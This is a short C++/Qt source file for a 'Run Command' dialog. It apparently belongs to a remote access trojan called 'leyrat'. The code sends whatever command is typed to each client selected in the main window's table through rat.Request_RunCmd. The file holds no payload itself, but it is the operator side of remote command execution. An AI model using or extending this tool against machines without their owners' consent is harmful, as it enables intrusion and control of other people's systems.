#include "runcommand.h"
#include "ui_runcommand.h"

#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "leyrat.h"

extern Ui::MainWindow *mainwin;
extern leyrat rat;

Runcommand::Runcommand(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Runcommand)
{
    ui->setupUi(this);
    this->setWindowTitle("Run Command");
    ui->pushButton->setFocusPolicy(Qt::NoFocus);
    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint | Qt::MSWindowsFixedSizeDialogHint);

}

Runcommand::~Runcommand()
{
    delete ui;
}

void Runcommand::on_pushButton_pressed()
{

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_RunCmd(item->text().toStdString().c_str(), ui->textEdit->toPlainText().toStdString().c_str());

    }



}
